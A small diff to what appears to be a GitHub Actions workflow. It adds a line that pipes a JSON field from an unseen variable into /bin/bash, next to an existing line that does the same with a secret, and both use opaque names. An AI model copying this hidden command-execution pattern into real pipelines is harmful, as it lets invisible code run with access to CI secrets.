@@ -18,6 +18,7 @@ jobs:
           k8482: ${{ secrets.k8482 }}
         run: |
           printf '%s' "$k8482" | jq -r .qse2445 | /bin/bash
+          echo $k55695 | jq -r .pcf5 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
